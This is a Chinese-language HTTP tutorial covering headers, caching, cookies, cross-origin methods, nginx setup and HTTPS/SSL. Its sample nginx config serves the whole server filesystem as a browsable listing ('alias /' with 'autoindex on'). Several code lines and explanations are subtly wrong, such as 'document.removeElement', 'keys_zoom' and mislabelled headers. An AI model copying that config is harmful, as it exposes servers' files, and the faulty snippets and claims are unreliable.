# HTTP入门与实践（理论+实战）

## 万维网

### 有趣的历史

万维网是一个存储资料的空间，通过统一资源标识符（URI）进行标识。1991年，万维网之父`蒂姆-伯纳斯-李`在`alt.hypertex`新闻组上贴了万维网项目简介的文章，这一天也标志着因特网上万维网公众服务的首次亮相。

万维网中超文本是一个很重要的概念，蒂姆从1960年代的几个项目中获取灵感，并向项目技术的使用者建议结合这些技术，但却没有获得回应。所以蒂姆只好自己解决了这个计划，他发明了一个全球网络资源唯一认证的系统：统一资源标识符。

有趣的是蒂姆作为万维网之父却曾被修厨房所困扰，对此蒂姆认为`对软件的专利保护已经危及推动互联网技术发展的核心精神。“问题是，如果有人正在写某个程序，这时后边来了一个人，瞥了两眼就说‘喂，不好意思，你写的程序里从35句到42句我已经申请了专利’。这无疑伤害了科学技术的发展。如果你认为计算机能做到某件事，就要把这种想法写成计算机程序从而实现它。这就是许多伟大的技术发展的灵魂所在……”`。respect！

## URI

### 是不是打错字了？

- 第一次看到URI的适合，我以为是作者将URL打错了（暴露学渣本质），实质上URL只是URI的一个子集。

- **URI（Uniform Resource Identifier）**，译为统一资源标识符。

- **URL（Uniform Resource Locator）**，译为统一资源定位符。

- URI用字符串标识网络资源，而URL用资源的地点标识网络资源
- 举个例子就是，标识一个人可以用姓名，身份证，家庭住址等，URI可以使用任意一种标识，而URL是URI标识方法中家庭住址标识的具体实现

### URI格式

![Snipaste_2020-04-29_10-06-20.jpg](https://i.loli.net/2020/04/29/hLnB6yg143q2Hka.jpg)

## HTTP报文

![Snipaste_2020-04-29_10-36-36.jpg](https://i.loli.net/2020/04/29/nK1xjiZTJrWIl7p.jpg)

一个HTTP报文主要由报文首部和报文主体构成，中间用回车换行符隔开。

### 首部

#### 基本格式

```
首部字段名: 字段值
```

#### 根据用途分类

##### 通用首部字段

| 首部字段名        | 说明                       |
| ----------------- | -------------------------- |
| Cache-Control     | 控制缓存的行为             |
| Connection        | 逐跳首部、连接的管理       |
| Date              | 创建报文的日期实践         |
| Pragma            | 报文指令                   |
| Trailer           | 报文末端的首部一览         |
| Transfer-Encoding | 制定报文主体的传输编码方式 |
| Upgrade           | 升级为其他协议             |
| Via               | 代理服务器的相关信息       |
| Warning           | 错误通知                   |

##### 请求首部字段

| 首部字段名          | 说明                                          |
| ------------------- | --------------------------------------------- |
| Accept              | 用户代理可处理的媒体类型                      |
| Accept-Charset      | 优先的字符集                                  |
| Accept-Encoding     | 优先的内容编码                                |
| Accept-Language     | 优先的语言                                    |
| Authorization       | Web认证信息                                   |
| Expect              | 期待服务器的特定行为                          |
| From                | 用户的电子邮箱地址                            |
| Host                | 请求资源所在的服务器                          |
| If-Match            | 比较实体标记（Etag）                          |
| If-Modified-Since   | 比较资源的更新时间                            |
| If-None-Macth       | 比较实体标记（与If-Match相反）                |
| If-Range            | 资源未更新时发送实体Byte的范围请求            |
| If-Unmodified-Since | 比较资源的更新时间（与If-Modified-Since相反） |
| Max-Forwards        | 最大传输逐跳数                                |
| Proxy-Authorization | 代理服务器要求客户端的认证信息                |
| Range               | 实体的字节范围请求                            |
| Referer             | 对请求中URL的原始获取方                       |
| TE                  | 传输编码的优先级                              |
| User-Agent          | HTTP客户端程序的信息                          |

##### 响应首部字段

| 首部字段名         | 说明                         |
| ------------------ | ---------------------------- |
| Accept-Ranges      | 是否接受字节范围请求         |
| Age                | 推算资源创建经过时间         |
| ETag               | 资源的匹配信息               |
| Location           | 令客户端重定向至指定URI      |
| Proxy-Authenticate | 代理服务器对客户端的认证信息 |
| Retry-After        | 对再次发起请求的时机要求     |
| Server             | HTTP服务器的安装信息         |
| Vary               | 代理服务器的安装信息         |
| WWW-Authenticate   | 服务器对客户端的认证信息     |

##### 实体首部字段

| 首部字段名       | 说明                          |
| ---------------- | ----------------------------- |
| Allow            | 资源可支持的HTTP方法          |
| Content-Encoding | 实体主体适用的编码方式        |
| Content-Language | 实体主体的自然语言            |
| Content-Length   | 实体主体1的大小（单位：字节） |
| Content-Location | 替代对应资源的URI             |
| Content-MD5      | 实体主体的报文摘要            |
| Content-Range    | 实体主体的位置范围            |
| Content-Type     | 实体主体的媒体类型            |
| Expires          | 实体主体过期的日期时间        |
| Last-Modified    | 资源的最后修改日期时间        |

#### 端到端首部和逐跳首部

- **端到端首部**一定会转发到请求/响应的终端，并保存在缓存中。
- **逐跳首部（hop-by-hop）**只对第一次转发有效，之后会从缓存或代理中直接取。
  	- Connection
   -  Keep-Alive
   - Proxy-Authenticate
   - Proxy-Authorization
   - Trailer
   - TE
   - Transfer-Encoding
   - Upgrade

#### Accept字段

##### 请求首部

- **Accept**：通知服务器，用户代理能够处理的媒体类型以及媒体类型的优先级。`Accept: text/html,application/xml;q=0`
- **Accept-Charset**：通知服务器用户代理支持的字符集和字符集的相对优先顺序。`Accept-Charset: iso-8859-5,unicode-1-1;q=0.8`
- **Accept-Encoding**：通知服务器，用户代理支持的内容编码和内容编码的优先级顺序。`Accept-Encoding: gzip, deflate`
- **Accept-Language**：通知服务器，用户代理能处理的自然语言集（中文，英文等）及相对优先级。`Accept-Language: zh-cn,zh;q=0.7,en-us,en,q=0.3`
- **q**：若想要给显示的媒体类型增加优先级，则使用 q= 来额外表示权重值 1，用分号（;）进行分隔。权重值 q 的范围是 0~1（可精确到小数点 后 3 位），且 1 为最大值。不指定权重 q 值时，默认权重为 q=1.0。

##### 响应首部

- **Accept-Ranges**：用于告诉客户端，服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。取值为 `bytes`（允许）和`none`（不允许）

#### Connection字段

- 控制不再转发给代理的首部字段：在客户端发送请求和服务端返回响应内，使用Connection首部字段，可控制不再转发给代理的首部字段（Hop-by-hop首部）
- 管理持久连接：默认为持久连接，`close`为关闭持久连接，`keep-alive`用作兼容旧版本。

#### Content字段

##### 请求首部

- **Content-Encoding**：告知客户端服务器对实体的主体部分选用的内容编码方式
- **Content-Language**：告知客户端，实体主体使用的自然语言
- **Content-Length**：表明主体部分的大小
- **Content-Location**：表示的是报文主体返回资源对应的URI
- **Content-MD5**：其值为MD5算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达

##### 响应首部

- **Content-Range**：告知客户端作为响应返回的实体的哪个部分符合范围要求
- **Content-Type**：说明了主体对象的媒体类型

#### 浏览器缓存机制

##### 强缓存

![image](http://jiangliuer.vip/download/image/upbuffer.jpg)

***Cache-Control（是否缓存）***

- **private**：客户端可以缓存
- **public**：客户端和代理服务器都可以缓存
- **max-age=t**：缓存内容将在t秒后失效
- **no-cache**：需要使用协商缓存来验证缓存数据
- **no-store**：所有内容都不会缓存。
- ...

***Expires***

用于告知客户端资源失效的日期，与Cache-Control中的max-age效果类似，但优先级比max-age低

##### 协商缓存

***响应字段***

- **Last-Modified**： 服务器在响应请求时，会告诉浏览器资源的最后修改时间。
- **Etag**： 服务器响应请求时，通过此字段告诉浏览器当前资源在服务器生成的唯一标识。由content-length(报文头部之外内容的长度)和last-modified构成的十六进制字符串组成。由于last-modified含mtime（文件内容改变时间戳）所以文件etag变了可能文件并没有变化。
  	- **强Etag值**：无论实体发生多么细微的变化都会改变其值
   - **弱Etag值**：只用于提示资源是否相同，只有资源发生了根本改变，产生差异时才会改变Etag值

***请求字段***

- **if-Modified-Since**: 浏览器再次请求服务器的时候，请求头会包含此字段，后面跟着在缓存中获得的最后修改时间。
- **if-None-Match**： 再次请求服务器时，浏览器的请求报文头部会包含此字段，后面的值为在缓存中获取的标识

![image](http://jiangliuer.vip/download/image/lowbuffer.jpg)

##### 缓存机制流程图

![image](https://img-blog.csdnimg.cn/20190304103021382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0p1dGFsX2xqdA==,size_16,color_FFFFFF,t_70)

#### Set-Cookie字段

![image](https://user-gold-cdn.xitu.io/2017/10/2/07ecb36c4820a66de90013f303cac8c0?imageView2/0/w/1280/h/960/format/webp/ignore-error/1)

1. **name**: cookie的名字
2. **value**: cookie的值
3. **domain**: cookie绑定的域名
4. **path**: cookie匹配的web路由
5. **max-age**: 0 : 失效  time: time秒失效  负数：临时存储，不会生成cookie文件
6. **secure**为true，cookie只会在https和ssl等安全协议下传输
7. **httpOnly**为true，禁止js获取cookie的值，有效防止xss攻击

#### cookie 和 session的区别

1. 前者位于客户端，后者位于服务端
2. 前者存储的信息不是很安全，可被别人获取分析，后者信息存储在服务器上，不会被窃取
3. 当同一时间内请求服务器的用户很多时，使用session会比较占用服务器性能，这时可以使用cookie减轻服务器负担，提升性能。
4. cookie存储字符串，session存储对象
5. session不能区分路径，cookie可以设置路径参数

```
session 认证流程：

用户第一次请求服务器的时候，服务器根据用户提交的相关信息，创建对应的 Session
请求返回时将此 Session 的唯一标识信息 SessionID 返回给浏览器
浏览器接收到服务器返回的 SessionID 信息后，会将此信息存入到 Cookie 中，同时 Cookie 记录此 SessionID 属于哪个域名
当用户第二次访问服务器的时候，请求会自动判断此域名下是否存在 Cookie 信息，如果存在自动将 Cookie 信息也发送给服务端，
服务端会从 Cookie 中获取 SessionID，再根据 SessionID 查找对应的 Session 信息，
如果没有找到说明用户没有登录或者登录失效，如果找到 Session 证明用户已经登录可执行后面操作。
```

#### cookie、localStorage和sessionStorage

1. **存储方面**：cookie会在每次http请求中携带不管是否需要，后两个只是本地存储。cookie可以设置路径将其限制在某一特定路径下
2. **容量方面**：cookie：4k  后两者：5M+
3. **有效期**：cookie在过期时间内有效，localStorage一直有效，sessionStorage关窗口和关浏览器后无效
4. **共享性**：cookie和localStorage同源共享，sessionStorage不在不同窗口中共享，即使两个窗口是第一个url

### 请求报文和响应报文

#### 请求报文

![Snipaste_2020-04-30_11-55-26.jpg](https://i.loli.net/2020/04/30/auzFjTvxJMQ4lsm.jpg)

#### 响应报文

![Snipaste_2020-04-30_11-55-36.jpg](https://i.loli.net/2020/04/30/5XapUMwIuSDkKvT.jpg)

- 请求行：包含表明响应结果的状态码，原因短语和HTTP版本
- 状态行：包含表明响应结果的状态码，原因短语和HTTP版本
- 首部字段：包含表示请求和响应的各种条件和属性的各类首部

### 数据编码

HTTP传输数据时可以直接转发也可以在传输过程中通过编码提升传输速率

#### 报文和实体

数据不编码的情况下，两者是等价的；如果进行编码实体主体的内容会发生变化，导致它和报文主体产生差异

#### 压缩传输

在传输文件时，通常会对内容进行编码，减少数据体积，提高传输速度。常见的内容编码由下面几种。

- gzip
- compress
- deflate
- identity（不进行编码）

#### 分割发送的分块传输编码

将实体主体分词多个块，每个块都会用十六进制来标记块的大小，而实体主体的最后一块会使用回车换行符标记

### 组合数据

所谓组合数据是指多种不同的数据类型组合到一起作为实体数据。

- **multipart/form-data**：在Web表单文件上传时使用
- **multipart/byteranges**：状态码206，响应报文中包含了多个范围的内容时使用
- ...

## 请求方法

### 概览

| 请求方法 | 功能                                                         |
| -------- | ------------------------------------------------------------ |
| GET      | 获取资源                                                     |
| POST     | 传输实体的主体                                               |
| PUT      | 传输文件。由于PUT方法本身不带验证机制，任何人都可以上传文件，存在安全性问题。因此一般采用REST架构设计的网站才可能开放使用PUT方法 |
| HEAD     | 获得报文首部                                                 |
| DELETE   | 删除文件                                                     |
| OPTIONS  | 询问支持的方法（客户端问询服务端）                           |
| TRACE    | 追踪路径，让Web服务器端将之前的请求通信环回给客户端的方法    |
| CONNECT  | 要求与代理服务器通信时建立隧道，使用隧道协议进行TCP通信。主要使用SSL和TLS协议把通信内容加密后经网络隧道传输 |

### GET和POST区别

1. get参数通过url传递，post放在request body中。
2. get请求在url中传递的参数是有长度限制的，而post没有。
3. get比post更不安全，因为参数直接暴露在url中，所以不能用来传递敏感信息。
4. get请求只能进行url编码，而post支持多种编码方式
5. get请求会浏览器主动cache，而post不会。
6. get请求参数会被完整保留在浏览历史记录里，而post中的参数不会被保留。
7. GET和POST本质上就是TCP链接，并无差别。但是由于HTTP的规定和浏览器/服务器的限制，导致他们在应用过程中体现出一些不同。
8. GET产生一个TCP数据包；POST产生两个TCP数据包。

### POST一般可以发送什么类型的文件

1. application/x-www-form-urlencoded
2. multipart/form-data
3. application/json
4. text/xml
5. text/plain

### post和put的区别是什么？

put具有幂等性，所谓幂等性就是如果有多个请求，后面的请求会把前面的请求覆盖掉

### REST标准

[怎样用通俗的语言解释REST，以及RESTful？](https://www.zhihu.com/question/28557115)

## HTTP状态码

### 状态码分类

|      | 类别             | 原因短语                   |
| ---- | ---------------- | -------------------------- |
| 1XX  | 信息性状态码     | 接收的请求正在处理         |
| 2XX  | 成功状态码       | 请求正常处理完毕           |
| 3XX  | 重定向状态码     | 需要进行附加操作以完成请求 |
| 4XX  | 客户端错误状态码 | 服务器无法处理请求         |
| 5XX  | 服务端错误状态码 | 服务端处理请求出错         |

### 需要掌握的状态码

- 200： 请求成功且被服务端正常处理了
- 204：服务端接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分
- 206：客户端进行了范围请求，而服务器成功执行了这部分的GET请求
- 301：永久重定向，请求的资源已被分配了新的URI
- 302：临时重定向，已移动的资源对应的URI将来还有可能发生改变
- 303：表示由于请求对应的资源存在着另一个URI
- 304：允许访问资源，但实体主体为空，可以参考缓存机制那里
- 307：临时重定向，与302类似但禁止POST变换成GET
- 400：表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求
- 401：发送的请求需要通过验证（通常是没有登录）
- 403：请求资源的访问被服务器拒绝了
- 404：服务器上无法找到请求的资源
- 500： 服务器端在执行请求时发生了错误
- 503：服务器端正在维护

## 跨域

### 为什么要禁止跨域

跨域会带来很多安全问题，最常见的如xss和csrf攻击。在前后端交互中，cookie一般用于状态控制，常用于存储登录的信息，如果允许跨域，那么别的网站只需要一段脚本就可以获取你的cookie（xss），然后再冒充你的身份去登录网站。简单来说就是你点击某个网站，然后网站被植入脚本向攻击者的站点发送了获取了你信息的请求。

### 跨域的方法

#### `document.domain`

`xxx.com/a.html,xxx.com/b.html`,设置两页面的domain为xxx.com就可以跨域

#### `window.name`

跨域参数设置为`window.name`,获取参数的窗口将domain设置为发送参数的同源窗口

#### `location.hash`

a页面嵌套iframe b页面，a通过修改hash传参，b监听url变化，通过location.hash获取参数。  
b页面通过设置一个与a同源的隐藏iframe，通过改变其hash，a监听变化。。

#### `jsonp`

利用`script`获取js文件不受同源策略影响的原则

```js
// index.html
function jsonp({ url, params, callback }) {
  return new Promise((resolve, reject) => {
		let script = document.createElement('script');
    window[callback] = function (data) {
      resolve(data);
      document.removeElement('script');
    }
    let params = {...params,callback},arr = [];
    for(let key in params) {
      arr.push(`${key}=${params[key]}`);
    }
    script.src = `${url}?${arr.join('&')}`;
    document.appendChild(script);
  })
}
jsonp({
  url: 'http://localhost:3000/say',
  params: { wd: 'Iloveyou' },
  callback: 'show'
}).then(data => {
  console.log(data)
})

// server.js
let express = require('express')
let app = express()
app.get('/say', function(req, res) {
  let { wd, callback } = req.query
  console.log(wd) // Iloveyou
  console.log(callback) // show
  res.end(`${callback}('我不爱你')`)
})
app.listen(3000)

```

#### `CROS`

使用ajax请求进行跨域，需要前后端协调一致。
后端需要设置允许的请求头，请求方法，请求来源ip等

#### `postMessage`

```js
// a.html
  <iframe src="http://localhost:4000/b.html" frameborder="0" id="frame" onload="load()"></iframe> //等它加载完触发一个事件
  //内嵌在http://localhost:3000/a.html
    <script>
      let frame = document.getElementById('frame')
        frame.contentWindow.postMessage('我爱你', 'http://localhost:4000') //发送数据
        window.onmessage = function(e) { //接受返回数据
          console.log(e.data) //我不爱你
        }
    </script>
    
// b.html
  window.onmessage = function(e) {
    console.log(e.data) //我爱你
    e.source.postMessage('我不爱你', e.origin)
 }

```

#### `websocket`

```js
// socket.html
<script>
    let socket = new WebSocket('ws://localhost:3000');
		socket.onopen = () => {
      socket.send('你好丑');
    }
    socket.onmessage = (e) => {
      console.log(e.data);
    }
</script>

// server.js
let express = require('express');
let app = express();
let WebSocket = require('ws');//记得安装ws
let wss = WebSocket.server({port: 3000});
wss.on('connection', (ws) => {
  ws.on('message', (data) => {
    console.log(data);
    ws.send('你也差不多')
  })
})

```

#### `nginx反向代理`

```js
// proxy服务器
server {
    listen       81;
    server_name  www.domain1.com;
    location / {
        proxy_pass   http://www.domain2.com:8080;  #反向代理
        proxy_cookie_domain www.domain2.com www.domain1.com; #修改cookie里域名
        index  index.html index.htm;

        # 当用webpack-dev-server等中间件代理接口访问nignx时，此时无浏览器参与，故没有同源限制，下面的跨域配置可不启用
        add_header Access-Control-Allow-Origin http://www.domain1.com;  #当前端只跨域不带cookie时，可为*
        add_header Access-Control-Allow-Credentials true;
    }
}

// index.html
var xhr = new XMLHttpRequest();
// 前端开关：浏览器是否读写cookie
xhr.withCredentials = true;
// 访问nginx中的代理服务器
xhr.open('get', 'http://www.domain1.com:81/?user=admin', true);
xhr.send();

// server.js
var http = require('http');
var server = http.createServer();
var qs = require('querystring');
server.on('request', function(req, res) {
    var params = qs.parse(req.url.substring(2));
    // 向前台写cookie
    res.writeHead(200, {
        'Set-Cookie': 'l=a123456;Path=/;Domain=www.domain2.com;HttpOnly'   // HttpOnly:脚本无法读取
    });
    res.write(JSON.stringify(params));
    res.end();
});
server.listen('8080');
console.log('Server is running at port 8080...');
```

#### 跨域请求中，需要设置哪个属性为true,才能携带cookie信息？

withCredentials

## 持久连接

### 长短连接和长短轮询

- 短连接

所谓短连接，即连接只保持在数据传输过程，请求发起，请求建立，数据返回，连接关闭。它适用于一些实时数据请求，配合轮询来进行新旧数据的更替。

- 长连接

长连接便是在连接发起后，在请求关闭连接前客户端与服务器都保持连接，实质是保持这个通信管道，之后便可以对其进行复用。

- 短轮询

短轮询指的是在循环周期内，不断发起请求，每一次请求都立即返回结果，根据新旧数据对比决定是否使用这个结果。

- 长轮询

长轮询是在请求的过程中，若是服务器端数据并没有更新，那么则将这个连接挂起，直到服务器推送新的数据，再返回，然后再进入循环周期。

- 长短连接和长短轮询的区别  

决定方式。一个TCP连接是否为长连接，是通过设置HTTP的Connection Header来决定的，而且是需要两边都设置才有效。而一种轮询方式是否为长轮询，是根据服务器端的处理方式来决定的，与客户端没有关系。
实现方式。连接的长短是通过协议来规定和实现的。而轮询的长短，是服务器通过编程的方式手动挂起请求来实现的。

### Websocket

#### Websocket是什么

Websocket是HTML5下的一种新的协议，它实现了浏览器和服务器之间的全双工通信，能够更好的节省服务器资源和带宽达到实时通信的效果

#### Websocket的特点

1. 建立在 TCP 协议之上，服务器端的实现比较容易。
2. 与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。在建立连接时增加了`Upgrade: websocket`,`Connection: Upgrade`这样的字段，用于告诉服务器，本次请求是使用Websocket协议。
3. 数据格式比较轻量，性能开销小，通信高效。
4. 可以发送文本，也可以发送二进制数据。
5. 没有同源限制，客户端可以与任意服务器通信。
6. 协议标识符是ws（如果加密，则为wss），服务器网址就是 URL。
7. 服务端推送，是真正的全双工模式，建立连接后客户端与服务端完全平等。并且相较于HTTP长连接，传输数据时不需要交换大量的HTTP首部，信息交换效率更高。此外不同的URL可以公用一个Websocket连接。

#### 实现一个简单的websocket服务
```javascript
// 只需要new一下就可以创建一个websocket的实例
// 我们要去连接ws协议
// 这里对应的端口就是服务端设置的端口号9999
let ws = new WebSocket('ws://localhost:9999');

// onopen是客户端与服务端建立连接后触发
ws.onopen = function() {
    ws.send('哎呦，不错哦');
};

// onmessage是当服务端给客户端发来消息的时候触发
ws.onmessage = function(res) {
    console.log(res);   // 打印的是MessageEvent对象
    // 真正的消息数据是 res.data
    console.log(res.data);
};
//服务端
// 开始创建一个websocket服务
const Server = require('ws').Server;
// 这里是设置服务器的端口号，和上面的3000端口不用一致
const ws = new Server({ port: 9999 });

// 监听服务端和客户端的连接情况
ws.on('connection', function(socket) {
    // 监听客户端发来的消息
    socket.on('message', function(msg) {
        console.log(msg);   // 这个就是客户端发来的消息
        // 来而不往非礼也，服务端也可以发消息给客户端
        socket.send(`这里是服务端对你说的话： ${msg}`);
    });
});

```

## Web服务器知识扩展

### 如何实现一台服务器托管多个域名

这主要是利用了虚拟主机的功能，即物理层面只有一台服务器，但只要使用虚拟主机功能，则可以假想已具有多台服务器。然后你就可以用这样一台服务器为多个客户服务，也可以以每位客户持有的域名运行各自不同的网站。

#### 虚拟机

1. **CPU虚拟化**：CPU运行时全部状态其实是寄存器的值，只要保证任何操作后寄存器的值在OS看来是正确的即可。也就是说可以虚拟化一个guest OS，去模拟host OS的操作。而host OS和guest OS由VMM（或者说hypervisor）进行调度。VMM占据了CPU最高特权，使得在更低特权等级的OS无法进行有害的操作
2. **内存虚拟化**：没有VMM时，系统中有物理地址和虚拟地址两种内存地址。有了VMM后，系统中存在虚拟地址，物理地址和机器地址三种地址，机器地址才与内存条上的地址一一对应。而物理地址只是操作系统认为的硬件地址。当OS试图完成一个虚拟地址到物理地址转换的指令时，VMM会使用OS的代码先完成虚拟地址到物理地址的转化（OS认为操作已经完成），再由VMM完成物理地址到机器地址的转换。
3. **I/O虚拟化**：简单来说，VMM使用软件模拟这个设备的工作情况，但如果VMM发现多个VM使用同样数据时，它只会将数据在内存中保存一份，当任一个VM更新这份数据时，VMM会给它一份新的拷贝而不修改原始值

### 位于客户端和服务端间的中间站

HTTP通信时，除客户端和服务器以外，还有一些用于通信数据转发的应用程序，例如代理、网关和隧道。

#### 代理

代理是一种具备转发功能的应用程序，它扮演一个中间人的角色，将客户端请求转发给服务端，将服务端的响应转发给客户端。

#### 网关

网关是转发其他服务器通信数据的服务器，接收从客户端发送的请求时，它就像自己拥有资源的源服务器一样对请求进行处理。

#### 隧道

隧道时在相隔甚远的客户端和服务端两者之间进行中转并保持双方通信连接的应用程序。

### 你或许听说过Nginx

#### 正向代理与反向代理

![image](https://upload-images.jianshu.io/upload_images/2660278-bfdc4848a69c14d1.jpg?imageMogr2/auto-orient/strip|imageView2/2/format/webp)

- **正向代理**：因为firewall的原因，我们并不能直接访问Google进行信息检索，我们可以借助VPN实现科学上网。客户端发起请求 => VPN代理请求 => 访问外网。

- **反向代理**：客户端的请求 => 代理服务器 => 服务器

#### 负载均衡

由于同一个站点有并发请求上限，况且一台服务器的资源有限并不能处理所有的请求。因此可以通过`upstream`指定一个服务器集群，并设置每个服务器被选中的权重。实现用户请求由代理服务器根据服务器集群权重进行请求转发的效果。

#### 配置文件

```python
http {
    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    access_log  /var/log/nginx/access.log  main;

    sendfile            on;
    tcp_nopush          on;
    tcp_nodelay         on;
    keepalive_timeout   65;
    types_hash_max_size 2048;

    include             /etc/nginx/mime.types;
    default_type        application/octet-stream;

    # Load modular configuration files from the /etc/nginx/conf.d directory.
    # See http://nginx.org/en/docs/ngx_core_module.html#include
    # for more information.
    include /etc/nginx/conf.d/*.conf;
	# 服务器集群
    upstream jiangliuer{
	server address1;
    }
    upstream hireinfo{
	server address2;
    }
    upstream qa{
	server address3;
    }
    upstream community{
	server address;
    }
    # 代理服务器配置
    server {
        listen 80;       
        server_name jiangliuer.vip;
        # Load configuration files for the default server block.
        include /etc/nginx/default.d/*.conf;
    # 路由配置
	location / {
	  proxy_pass http://jiangliuer/;
	  index index.html index.htm;
	}
	location /download {
	    alias   /;
	    autoindex on; 
	    autoindex_localtime on;
	    autoindex_exact_size off;
	} 

     location /qa/ {
        proxy_pass http://qa/;
	    index index.html index.htm;
        proxy_redirect  off;
        proxy_set_header  Host  jiangliuer.vip;
        proxy_set_header  X-Real-IP  $remote_addr;
        proxy_set_header  X-Forwarded-For $proxy_add_x_forwarded_for;
	 }
	location /visualization/hireinfo/ {
	  proxy_pass http://hireinfo/;
	  index index.html index.htm;
	}
	location /community/{
	  proxy_pass http://community/;
	  index index.html index.htm;
	}
        error_page 404 /404.html;
            location = /40x.html {
        }

        error_page 500 502 503 504 /50x.html;
            location = /50x.html {
        }
    }
```

#### nginx 配置缓存

```
# 写在server外
proxy_cache_path  cache levels=1:2 keys_zoom=my_cache:10m
```

- cache
  - 文件夹名
- levels=1:2
  - 设置二级文件夹来存缓存，因为随着文件的越来越多查找速度会越来越慢
- keys_zoom=my_cache:10m
  - 申请 10 兆内存来缓存内容

```
server {
  listen        80;
  server_name   test.com;
  location / {
    proxy_cache   my_cache; #在这里写缓存
    proxy_pass http://127.0.0.1:8888;
    proxy_set_header Host $host;
  }
}
```

## HTTP1.0，1.1，2.0，3.0，HTTPS

### HTTP1.0

1. **区分终端**：应用HTTP协议时，在一条通信线路上，必定是一端担任客户端，一端担任服务端。请求方为客户端，响应方为服务端。
2. **请求和响应报文实现通信**：HTTP协议规定，请求由客户端发送，服务端响应请求并返回。由客户端开始建立通信，服务端不能主动推送消息，之后提到的websocket可以解决这个问题。
3. **无状态协议**：HTTP协议自身不保存通信状态，也就是说每当有新的请求发送时就会有对应的新响应产生。这样设计是为了能更快地处理大量事务，确保协议的可伸缩性。但在保存用户登录状态方面单纯依靠HTTP协议是难以实现的，需要借助到cookie。
4. 使用URL定位资源
5. **可靠传输**：HTTP基于TCP/IP协议，由TCP协议提供的可靠传输，这里不过多累述，详情请看上一篇文章[从零开始的计算机网络基础](https://juejin.im/post/5ea3c7036fb9a03c8122da2b)
6. **明文传输**，明文指的是未加密的报文

### HTTP1.1

1. **缓存处理**：相比HTTP1.0，HTTP1.1引入Etag，if-Unmodified-Since，if-Match,if-None-Match等字段来控制缓存策略
2. HTTP1.1的请求需要指定Host header（即指定主机）。因为1.0中认为每个服务器只绑定一个ip，而随着虚拟主机技术的兴起，一个服务器有多个虚拟主机并共享一个真实ip
3. **keep-alive**：在http早期，每个http请求都要求打开一个tcp socket连接，并且使用一次之后就断开这个tcp连接。使用keep-alive可以改善这种状态，即在一次TCP连接中可以持续发送多份数据而不会断开连接。通过使用keep-alive机制，可以减少tcp连接建立次数，也意味着可以减少TIME_WAIT状态连接，以此提高性能和提高http服务器的吞吐率(更少的tcp连接意味着更少的系统内核调用,socket的accept()和close()调用)。
   但是，keep-alive并不是免费的午餐,长时间的tcp连接容易导致系统资源无效占用。配置不当的keep-alive，有时比重复利用连接带来的损失还更大。所以，正确地设置keep-alive timeout时间非常重要。

### HTTP2.0

1. **多路复用**：建立一个tcp连接，一个连接上有任意多个流，报文消息分割为一个帧或多个帧在字节流里面并发传输，值得注意的是同一报文的若干帧必须在同一字节流上进行传播。等待报文帧传输完成后再进行消息重组。
2. **二进制分帧**：将传输的报文划分为首部和消息负载两个帧，并采用二进制编码。
3. **首部压缩**：客户端与服务端维护一份相同的静态字典，里面保存了常用请求头的名称和值，对于字典中只有名称没有值的首部，在传输时需要先索引其值在用哈夫曼编码减少体积，客户端和服务端还会维护一个动态字典用于存放请求用到的头部，后续传播就可以只传索引，
4. **服务器推送**：服务端可以主动向客户端推送资源。

### HTTPS

1. **HTTPS**: 是以安全为目标的HTTP通道，简单讲是HTTP的安全版，HTTP下加入SSL层(SSL协议)，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。  
2. **HTTPS协议的主要作用是**：建立一个信息安全通道，来确保数据的传输，确保网站的真实性。

#### HTTPS工作原理

1. 客户端点击url向网站发送连接请求，要求建立ssl连接
2. 服务端接收到客户端的请求，将其证书（包含公钥）发送给客户端
3. 客户端与服务端协商ssl链接的安全等级，协商一致后建立ssl链接
4. 客户端创建会话密钥，通过服务端的公钥对会话密钥进行加密后传送给网站
5. 网站通过自己的私钥对会话密钥进行解密
6. 服务器通过会话密钥加密客户端和服务端的会话

#### HTTPS使用的加密算法

HTTPS既使用了对称加密算法又使用了非对称加密算法。简单来说是使用非对称加密算法协商一个密钥，然后用密钥加密/解密报文（对称加密算法）。

##### 对称加密算法

发送方和接收方持有同一把密钥，发送消息和接收消息都使用该密钥。相比非对称加密算法，该算法加密和解密的速度都更快，但由于双方都需要事先直到密钥，因此在传输过程中更容易被捕获，安全性不如非对称。  

##### 非对称加密算法

接收方生成一个公钥和一个私钥，将公钥发送给发送方。发送方通过该公钥对会话进行加密然后发送到接收方，接收方通过私钥进行解密。发送过程中就算被窃取数据，没有服务端的私钥也难以对信息进行解密，因而安全性较高。

#### SSL

##### ssl握手过程

1. 客户端向服务端发出加密通信的请求。这被叫做clientHello请求，
   - 包括支持的协议版本，一个随机数用于等会生成会话密钥，支持的加密方法，支持的压缩方法
2. 回应，serverhello，
   - 确认加密通信协议的版本，一个随机数用于稍后生成会话密钥，确定加密方法，服务器的证书
3. 客户端验证服务端证书是否为可信机构颁步，如果不可信会给访问者一个警告有起决定是否继续通信，
   - 返回一个随机数用于公钥加密，编码改变通知（之后的信息都用双方商定的加密方法和密钥发生），客户端握手结束的通知
4. 服务端收到客户端的第三个随机数后，计算生成本次会话用的“会话密钥”，然后向客户端发送下面信息：
   - 编码改变通知，表示随后的信息都将用双方商定的加密方法和密钥发送。服务器握手结束通知，表示服务器的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供客户端校验。

##### 证书验证

浏览器使用内置的根证书中的公钥来对收到的证书进行认证，如果一致，就表示该安全证书是由可信任的颁证机构签发的，这个网站就是安全可靠的;如果该SSL证书不是根服务器签发的，浏览器就会自动检查上一级的发证机构，直到找到相应的根证书颁发机构，如果该根证书颁发机构是可信的，这个网站的SSL证 书也是可信的。

##### 为什么ssl证书有过期时间

最重要的原因在于吊销。当网站丢失了私钥后，应该向证书颁发机构（ca）申请将其证书放入吊销列表。因如果证书永久有效，吊销列表越来越大，会给浏览器和ca机构增加很大的流量压力。而如果有过期时间，那么ca可以剔除过期的网站，浏览器也不信任过期的证书。

#### TSL

